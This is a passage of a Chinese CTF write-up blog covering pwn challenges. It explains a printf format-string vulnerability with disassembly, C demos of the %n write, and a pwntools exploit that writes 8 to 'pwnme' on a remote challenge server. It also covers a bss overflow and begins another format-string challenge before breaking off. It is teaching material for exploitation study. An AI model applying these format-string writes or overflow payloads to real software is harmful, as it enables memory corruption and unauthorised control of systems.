mov     ebp, esp</span><br><span class="line">.text:080485D0                 push    edi</span><br><span class="line">.text:080485D1                 push    esi</span><br><span class="line">.text:080485D2                 push    ebx</span><br><span class="line">.text:080485D3                 and     esp, 0FFFFFFF0h ; esp寄存器低4位归零</span><br><span class="line">.text:080485D6                 sub     esp, 90h</span><br><span class="line">.text:080485DC                 mov     eax, large gs:14h</span><br><span class="line">.text:080485E2                 mov     [esp+9Ch+anonymous_1], eax</span><br><span class="line"></span><br><span class="line">; 设置标准输入,标准输出,标准错误的缓冲区大小为0</span><br><span class="line">.text:080485E9                 xor     eax, eax</span><br><span class="line">.text:080485EB                 mov     eax, ds:stdin@@GLIBC_2_0 </span><br><span class="line">.text:080485F0                 mov     [esp+9Ch+var_98], 0 ; buf</span><br><span class="line">.text:080485F8                 mov     [esp+9Ch+stream], eax ; stream</span><br><span class="line">.text:080485FB                 call    _setbuf</span><br><span class="line">.text:08048600                 mov     eax, ds:stdout@@GLIBC_2_0</span><br><span class="line">.text:08048605                 mov     [esp+9Ch+var_98], 0 ; buf</span><br><span class="line">.text:0804860D                 mov     [esp+9Ch+stream], eax ; stream</span><br><span class="line">.text:08048610                 call    _setbuf</span><br><span class="line">.text:08048615                 mov     eax, ds:stderr@@GLIBC_2_0</span><br><span class="line">.text:0804861A                 mov     [esp+9Ch+var_98], 0 ; buf</span><br><span class="line">.text:08048622                 mov     [esp+9Ch+stream], eax ; stream</span><br><span class="line">.text:08048625                 call    _setbuf</span><br><span class="line"></span><br><span class="line">;各变量,缓冲区初始化</span><br><span class="line">.text:0804862A                 mov     [esp+9Ch+buf], 0</span><br><span class="line">.text:08048632                 mov     [esp+9Ch+var_7A], 0</span><br><span class="line">.text:0804863A                 mov     [esp+9Ch+anonymous_0], 0</span><br><span class="line">.text:08048641                 lea     ebx, [esp+9Ch+s]</span><br><span class="line">.text:08048645                 mov     eax, 0          ; eax将会被拷贝到串中的各个字符</span><br><span class="line">.text:0804864A                 mov     edx, 19h        ; 重复次数19h=25次,每次</span><br><span class="line">.text:0804864F                 mov     edi, ebx</span><br><span class="line">.text:08048651                 mov     ecx, edx</span><br><span class="line">.text:08048653                 rep stosd               ; s串置零</span><br><span class="line"></span><br><span class="line">;打印第一句废话</span><br><span class="line">.text:08048655                 mov     [esp+9Ch+stream], offset s ; &quot;please tell me your name:&quot;</span><br><span class="line">.text:0804865C                 call    _puts</span><br><span class="line"></span><br><span class="line">;获取第一句输入</span><br><span class="line">.text:08048661                 mov     [esp+9Ch+nbytes], 0Ah ; nbytes</span><br><span class="line">.text:08048669                 lea     eax, [esp+9Ch+buf]</span><br><span class="line">.text:0804866D                 mov     [esp+9Ch+var_98], eax ; buf</span><br><span class="line">.text:08048671                 mov     [esp+9Ch+stream], 0 ; fd</span><br><span class="line">.text:08048678                 call    _read                            ;从标准输入至多获得A=10字节的输入作为名字</span><br><span class="line"></span><br><span class="line">;打印第二句废话</span><br><span class="line">.text:0804867D                 mov     [esp+9Ch+stream], offset aLeaveYourMessa ; &quot;leave your message please:&quot;</span><br><span class="line">.text:08048684                 call    _puts</span><br><span class="line"></span><br><span class="line">;获取第二句输入</span><br><span class="line">.text:08048689                 mov     eax, ds:stdin@@GLIBC_2_0</span><br><span class="line">.text:0804868E                 mov     [esp+9Ch+nbytes], eax ; stream           ;标准输入魔数0-&gt;eax-&gt;nbytes,实际上参数名字与其用处不相符了</span><br><span class="line">.text:08048692                 mov     [esp+9Ch+var_98], 64h ; n          ; 从标注输入至多获取64h=100字节的输入放到s,恰好和s的大小相同</span><br><span class="line">.text:0804869A                 lea     eax, [esp+9Ch+s]</span><br><span class="line">.text:0804869E                 mov     [esp+9Ch+stream], eax ; s</span><br><span class="line">.text:080486A1                 call    _fgets                               ;从标注输入获取至多64h=100字节的输入作为信息message,放在s串</span><br><span class="line"></span><br><span class="line">;打印刚才获取到的信息和新的废话</span><br><span class="line">.text:080486A6                 lea     eax, [esp+9Ch+buf]</span><br><span class="line">.text:080486AA                 mov     [esp+9Ch+var_98], eax</span><br><span class="line">.text:080486AE                 mov     [esp+9Ch+stream], offset format ; &quot;hello %s&quot;</span><br><span class="line">.text:080486B5                 call    _printf</span><br><span class="line">.text:080486BA                 mov     [esp+9Ch+stream], offset aYourMessageIs ; &quot;your message is:&quot;</span><br><span class="line">.text:080486C1                 call    _puts</span><br><span class="line"></span><br><span class="line">;关键</span><br><span class="line">.text:080486C6                 lea     eax, [esp+9Ch+s]</span><br><span class="line">.text:080486CA                 mov     [esp+9Ch+stream], eax ; format</span><br><span class="line">.text:080486CD                 call    _printf								;蜜汁操作,printf只有一个参数</span><br><span class="line"></span><br><span class="line">;关键</span><br><span class="line">.text:080486D2                 mov     eax, ds:pwnme</span><br><span class="line">.text:080486D7                 cmp     eax, 8          ; 当ds:pwnme被修改为8时获得flag</span><br><span class="line">.text:080486DA                 jnz     short loc_80486F6</span><br><span class="line">.text:080486DC                 mov     [esp+9Ch+stream], offset aYouPwnedMeHere ; &quot;you pwned me, here is your flag:\n&quot;</span><br><span class="line">.text:080486E3                 call    _puts</span><br><span class="line">.text:080486E8                 mov     [esp+9Ch+stream], offset command ; &quot;cat flag&quot;</span><br><span class="line">.text:080486EF                 call    _system</span><br><span class="line">.text:080486F4                 jmp     short loc_8048702</span><br></pre></td></tr></table></figure>
<p>双击<code>ds:pwnme</code>观察其上下文</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">.bss:0804A064 completed_6591  db ?                    ; DATA XREF: __do_global_dtors_aux↑r</span><br><span class="line">.bss:0804A064                                         ; __do_global_dtors_aux+14↑w</span><br><span class="line">.bss:0804A065                 align 4</span><br><span class="line"></span><br><span class="line">.bss:0804A068                 public pwnme</span><br><span class="line">.bss:0804A068 pwnme           dd ?                    ; DATA XREF: main+105↑r</span><br><span class="line">.bss:0804A068 _bss            ends					;这里可以获取到的有效信息是pwnme的地址0x0804A068</span><br><span class="line">.bss:0804A068</span><br><span class="line">.prgend:0804A06C ; ===========================================================================</span><br><span class="line">....</span><br></pre></td></tr></table></figure>
<h3 id="格式化字符串漏洞套路printf">格式化字符串漏洞套路printf</h3>
<p>以下逐步尝试使用格式化字符串漏洞修改<strong>栈上</strong>的变量值,看看printf是如何沦陷的</p>
<p>首先栈上有一个<code>int a</code>,有一个<code>char s[120]</code>,要想通过格式化字符串漏洞修改一个变量的值,需要知道他在栈上什么位置</p>
<p>谁更靠近栈顶光是通过看源代码是看不出来的,有可能有各种编译优化,通过下面程序观察</p>
<p><code>mytest.c</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">	<span class="type">int</span> a=<span class="number">20</span>;</span><br><span class="line">    <span class="type">char</span> s[<span class="number">120</span>]=<span class="string">&quot;%p-%p-%p-%p&quot;</span>;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%p\n%p\n&quot;</span>,&amp;a,&amp;s);<span class="comment">//观察a和s在栈中的位置</span></span><br><span class="line">	<span class="built_in">printf</span>(s);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里后面的<code>printf(s)</code>没有管s中如何格式化的,没有管s中指定了多少个参数,</p>
<p>如果s中指定了n个%p格式的参数,则printf会从栈顶开始向栈底方向依次取出n个32位数(恰好是一个双字),每一个对应一个%p</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿Executor)-[/mnt/c/Users/86135/desktop/pwn/CGfsb]</span><br><span class="line">└─# gcc mytest.c -Og -m32 -o mytest		<span class="comment">#-m32编译成32位程序,栈上32位对齐</span></span><br></pre></td></tr></table></figure>
<p>运行结果</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿Executor)-[/mnt/c/Users/86135/desktop/pwn/CGfsb]</span><br><span class="line">└─# ./mytest</span><br><span class="line">0xffaf269c</span><br><span class="line">0xffaf2624</span><br><span class="line">0xffaf269c-0xffaf2624-0xf63d4e2e-0x5655b2b2</span><br></pre></td></tr></table></figure>
<p>说明<code>int a</code>在栈顶,然后紧接着是<code>char s[120]</code>的首地址</p>
<p>那么printf(s)会错误地把a作为第一个参数,栈上存储的是a的地址,使用<code>%1$n</code>即可将格式化字符串s之前的字符数输入栈上第一个参数(期望是一个地址)</p>
<blockquote>
<p>啥意思呢?<code>%x$n</code>即将其之前的字符数输出到格式化字符串指定的第x个地址(即使栈上存放的不是地址也要作为地址,但此时很有可能引发段错误)</p>
<p>这句话非常绕口,还是以先前的程序为例子</p>
<p>在这个例子中,通过先前的打印已经知道<code>printf(s)</code>时栈顶是<code>a</code>的地址,如果s串中没有<code>%p,%x</code>等等这样的占位符,即如果s为纯字符串则<code>printf</code>只会打印该字符串,然后什么都不会发生</p>
<p>如果s中有一个<code>%p</code>即指定了一个<strong>格式化参数</strong>,但是在调用<code>printf(s)</code>时并没有写成<code>printf(s,a)</code>这样指定这个参数,那么<code>printf</code>会自动将当前栈顶作为参数进行打印,于是就发生了信息泄漏</p>
<blockquote>
<p>使用%p这种格式的作用是,正好取栈上一个对齐单元32位4字节,</p>
<p>如果用%s则将参数作为字符串,一直打印直到'\0'</p>
</blockquote>
<p>同理如果s中有两个<code>%p</code>即指定了两个<strong>格式化参数</strong>,则先后从栈顶向栈底方向取两个双字,以16进制形式打印</p>
<p><code>%x$n</code>的作用是,将%号之前格式化字符串中的字符数,输出到第n个<strong>格式化参数</strong>指向的内存地址,即将从栈顶向栈底数的第n个双字,作为一个32位地址,然后输出到该地址,</p>
<blockquote>
<p>实际上这个双字也可能不是一个地址,这时大概率引发段错误</p>
</blockquote>
</blockquote>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">	<span class="type">int</span> a=<span class="number">20</span>;</span><br><span class="line">    <span class="type">char</span> s[<span class="number">120</span>]=<span class="string">&quot;%p-%p-%p-%p&quot;</span>;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%p\n%p\n&quot;</span>,&amp;a,&amp;s);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%1$n&quot;</span>);						<span class="comment">//%1$n之前没有字符,因此0会被输出到栈上第一个</span></span><br><span class="line">	<span class="built_in">printf</span>(s);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;\n%d&quot;</span>,a);				</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>同样的编译命令,运行结果为:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿Executor)-[/mnt/c/Users/86135/desktop/pwn/CGfsb]</span><br><span class="line">└─# ./mytest</span><br><span class="line">0xffee562c</span><br><span class="line">0xffee55b4</span><br><span class="line">0xffee562c-0xffee55b4-0xf63d4e2e-0x565632b2</span><br><span class="line">0</span><br></pre></td></tr></table></figure>
<blockquote>
<p>a的地址,<code>0xffee562c</code>被printf默认当作第一个格式化参数,然后将<code>%1$n</code>之前的0个字符输出到该地址,因此a原来的值20就被改变了</p>
</blockquote>
<h3 id="回到本题">回到本题</h3>
<p>从刚才的实验中我们可以知道</p>
<p>如果想要通过printf格式化字符串漏洞改变一个变量的值,需要先了解</p>
<p>1.变量的地址</p>
<p>2.如果将变量的地址写成一个32位数然后压栈,在打印的时候是第几个双字,这用于确定<code>%x$n</code>中的x</p>
<p>3.%x$n之前的字符数决定了把第x个格式化参数指向的变量修改成多少</p>
<p>本题中</p>
<p>可以通过ida得出pwnme的地址<code>0x0804A068</code></p>
<p>下面尝试观察格式化字符串的第一个双字是printf的第几个格式化双字参数</p>
<blockquote>
<p>这句话说地又跟放屁似的,啥意思呢?</p>
<p>比如构造一个格式化字符串<code>s="AAAA-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p"</code></p>
<p>作用是判断第一个双字(这里用<code>0x41414141</code>AAAA占位),是栈上第几个双字,以此决定<code>%x$n</code>中的x</p>
<p>这里s也会被四个字符一组作为一个双字压栈,那么前四个字符AAAA必然作为一个双字压栈,</p>
</blockquote>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">your message is:</span><br><span class="line">AAAA-0xffebcaee-0xf7f6c580-0xffebcb4c-0xf7fb4b30-0x1-0xf7f7a420-0x32310001-0xa33-(nil)-0x41414141-0x2d70252d-0x252d7025</span><br><span class="line">Thank you!</span><br></pre></td></tr></table></figure>
<p>整体要按照s给出的格式打印,s自己也会作为一个普通的字符串存储在栈上</p>
<p>这里第10个格式化参数对应的<code>0x41414141</code>即为s中前四个字符存储在栈上的一个双字,显然这不是一个地址</p>
<blockquote>
<p>第一个格式化参数对应的是<code>0xffebcaee</code>这是一个地址,</p>
<p>再往前的四个A不是格式化参数,是s中的常量</p>
</blockquote>
<p>后面第11个格式化参数对应<code>0x2d70252d</code>对应ascii码<code>-p%-</code></p>
<p>可想而知,s无论我们继续写多长,第10个参数总是<code>0x41414141</code>,因为s作为普通的字符串放在栈上距离栈顶较远的地方</p>
<p>现在将s的头四个A换成<code>p32(0x0804A068)</code>,即将pwnme的地址写成一个双字作为s的头四个字符(非可打印字符)</p>
<p>那么可想而知此时第10个格式化参数就得对应<code>0x0804A068</code></p>
<p>就差最后一步了,向该地址上写个8</p>
<p>我们已经在最开始写了一个<code>p32(0x0804A068)</code>相当于4个字符,还需要写入4个字符,随便整四个就可以比如'1234',然后就是<code>%10$n</code></p>
<p>如此可以写出exp</p>
<h3 id="exp-6">exp</h3>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># sh=process(&#x27;./cgfsb&#x27;)</span></span><br><span class="line"></span><br><span class="line">sh=remote(<span class="string">&#x27;111.200.241.244&#x27;</span>,<span class="string">&#x27;61044&#x27;</span>)</span><br><span class="line"></span><br><span class="line">pwnme=<span class="number">0x0804A068</span>;</span><br><span class="line"></span><br><span class="line">payload=p32(pwnme)+(<span class="string">&#x27;1234%10$n&#x27;</span>).encode()</span><br><span class="line"></span><br><span class="line">sh.recvuntil(<span class="string">&quot;please tell me your name:\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">sh.sendline(<span class="string">&#x27;123&#x27;</span>)</span><br><span class="line"></span><br><span class="line">sh.recvuntil(<span class="string">&quot;leave your message please:\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">sh.sendline(payload)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br><span class="line"></span><br><span class="line"><span class="comment"># sh.interactive()</span></span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">hello 123</span><br><span class="line">your message is:</span><br><span class="line">h\xa0\x041234</span><br><span class="line">you pwned me, here is your flag:</span><br><span class="line"></span><br><span class="line">cyberpeace&#123;99ded663a753efee263e10ce468b73c3&#125;</span><br></pre></td></tr></table></figure>
<h2
id="hello_pwn栈缓冲区溢出修改栈中整数">009hello_pwn(栈缓冲区溢出修改栈中整数)</h2>
<p>ida64打开之后F5观察伪代码</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">read(<span class="number">0</span>, &amp;unk_601068, <span class="number">0x10</span>uLL);		</span><br><span class="line"><span class="keyword">if</span> ( dword_60106C == <span class="number">1853186401</span> )			<span class="comment">//诚如是,则执行sub_400686(),dword_60106C就是需要通过溢出修改的变量</span></span><br><span class="line">  sub_400686();</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">__int64 <span class="title function_">sub_400686</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  system(<span class="string">&quot;cat flag.txt&quot;</span>);<span class="comment">//调用shell,打印flag.txt的内容到屏幕</span></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<p><code>read</code>系统调用函数</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">read</span><span class="params">(<span class="type">int</span> fd,<span class="type">char</span> *buf,<span class="type">unsigned</span> nbytes)</span>;</span><br></pre></td></tr></table></figure>
<p><strong>参数含义:</strong></p>
<p>1.<code>int fd:</code>file descriptor 文件描述符</p>
<blockquote>
<p>fd=0为<code>STDIN_FLIENO</code>标准输入的魔数</p>
</blockquote>
<blockquote>
<p>fd=1为<code>STDOUT_FILENO</code>标准输出的魔数</p>
<p>fd=2为<code>STDERR_FILENO</code>标准错误的魔数</p>
</blockquote>
<p>2.<code>char *buf:</code>缓冲区</p>
<p>3.<code>unsigned nbytes:</code>指定输入的字节数,实际上获取到的输入只能小于等于该值</p>
<p>如果从一个小文件里获取大于文件字符数的输入则达不到<code>nbytes</code></p>
<p><strong>返回值:</strong></p>
<p>实际获取到的输入字符数</p>
</blockquote>
<p><code>read(0, &amp;unk_601068, 0x10uLL);</code></p>
<p>从标准输入获取至多16字节的输入到缓冲区<code>unk_601068</code></p>
<p>双击<code>unk_601068</code>观察缓冲区在内存的分布</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">.bss:0000000000601068 unk_601068      db    ? ;               ; DATA XREF: main+3B↑o</span><br><span class="line">.bss:0000000000601069                 db    ? ;</span><br><span class="line">.bss:000000000060106A                 db    ? ;</span><br><span class="line">.bss:000000000060106B                 db    ? ;</span><br><span class="line">.bss:000000000060106C dword_60106C    dd ?                    ; DATA XREF: main+4A↑r</span><br></pre></td></tr></table></figure>
<p>发现缓冲区<code>unk_601068</code>和<code>dword_60106C</code>这个需要被溢出修改的变量是在bss段紧挨着存放的,两者都是未初始化的全局变量</p>
<p>那么输入前四个字符就已经写满了缓冲区,<code>dword_60106C</code>是一个双字四字节,可以容纳四个ascii字符,考虑后面四个字符输入什么才能使其值被修改为<code>1853186401</code></p>
<p>写成16进制<code>0x6e756161</code>两两一组一个字节,分组的话恰好分成四组,对应四个ascii码</p>
<p><code>0x6e=n</code></p>
<p><code>0x75=u</code></p>
<p><code>0x61=a</code></p>
<p><code>0x61=a</code></p>
<p>输入的字符串在前面的放在低位,即如果<code>str="nuaa"</code>则<code>str[0]='n',str[1]='u',str[2]='a'</code>而根据小端方法,下标小的字符会放在低地址,即</p>
<p><code>'n'-&gt;0x60106C</code></p>
<p><code>'u'-&gt;0x60106D</code></p>
<p><code>'a'-&gt;0x60106E</code></p>
<p><code>'a'-&gt;0x60106F</code></p>
<p>然后从<code>0x60106C</code>开始连续取四个字节作为一个<code>int</code>,得到的是<code>0x(高位)61 61 75 6e(低位)</code>刚好和我们想要的结果<code>0x6e756161</code>是反着的,因此应该输入aaun而不是nuaa</p>
<h2
id="stringprintf格式化字符串漏洞ret2shellcode">010string(printf格式化字符串漏洞,ret2shellcode)</h2>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿Executor)-[/mnt/c/Users/86135/desktop/pwn/string]</span><br><span class="line">└─# checksec string</span><br><span class="line">[*] <span class="string">&#x27;/mnt/c/Users/86135/desktop/pwn/string/string&#x27;</span></span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>
<p>64位linux程序,用ida64打开之后直接看F5伪代码</p>
<h3 id="main-1">main</h3>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> a1, <span class="type">char</span> **a2, <span class="type">char</span> **a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  _DWORD *v4; <span class="comment">// [rsp+18h] [rbp-78h]//双字指针类型,int*</span></span><br><span class="line"></span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>);</span><br><span class="line">  alarm(<span class="number">0x3C</span>u);</span><br><span class="line">  sub_400996();</span><br><span class="line">  v4 = <span class="built_in">malloc</span>(<span class="number">8uLL</span>);</span><br><span class="line">  *v4 = <span class="number">68</span>;</span><br><span class="line">  v4[<span class="number">1</span>] = <span class="number">85</span>;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;we are wizard, we will give you hand, you can not defeat dragon by yourself ...&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;we will tell you two secret ...&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;secret[0] is %x\n&quot;</span>, v4);					<span class="comment">//&amp;v4的16进制表示</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;secret[1] is %x\n&quot;</span>, v4 + <span class="number">1</span>);				<span class="comment">//&amp;v4+1的16进制表示,由于开启栈地址随机化,因此该值每次运行不定</span></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;do not tell anyone &quot;</span>);</span><br><span class="line">  sub_400D72((__int64)v4);				<span class="comment">//游戏剧情</span></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;The End.....Really?&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="sub_400d72">sub_400D72</h3>
<p><code>v4</code>作为参数从main传递到sub_400D72</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 __fastcall <span class="title function_">sub_400D72</span><span class="params">(__int64 a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s[<span class="number">24</span>]; <span class="comment">// [rsp+10h] [rbp-20h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v3; <span class="comment">// [rsp+28h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;What should your character&#x27;s name be:&quot;</span>);</span><br><span class="line">  _isoc99_scanf(<span class="string">&quot;%s&quot;</span>, s);</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strlen</span>(s) &lt;= <span class="number">0xC</span> )			<span class="comment">//要求输入的角色名称要小于等于12个字符</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Creating a new player.&quot;</span>);</span><br><span class="line">    sub_400A7D();					<span class="comment">//故事的开端发展高潮</span></span><br><span class="line">    sub_400BB9();</span><br><span class="line">    sub_400CA6((_DWORD *)a1);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Hei! What&#x27;s up!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="sub_400a7d">sub_400A7D</h3>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">sub_400A7D</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s1[<span class="number">8</span>]; <span class="comment">// [rsp+0h] [rbp-10h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v2; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot; This is a famous but quite unusual inn. The air is fresh and the&quot;</span>);</span><br><span class="line">...</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;So, where you will go?east or up?:&quot;</span>);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    _isoc99_scanf(<span class="string">&quot;%s&quot;</span>, s1);</span><br><span class="line">    <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(s1, <span class="string">&quot;east&quot;</span>) || !<span class="built_in">strcmp</span>(s1, <span class="string">&quot;east&quot;</span>) )<span class="comment">//蜜汁操作,两个判断都是strcmp(s1,&quot;east&quot;),当s1为east时跳出循环</span></span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">      <span class="comment">//当s1!=east一直循环请求输入</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;hei! I&#x27;m secious!&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;So, where you will go?:&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strcmp</span>(s1, <span class="string">&quot;east&quot;</span>) )			<span class="comment">//蜜汁操作,出了刚才的循环则s1=east,这里的if条件判断一定不会成立,为什么还要设计这么一条路呢?</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( !<span 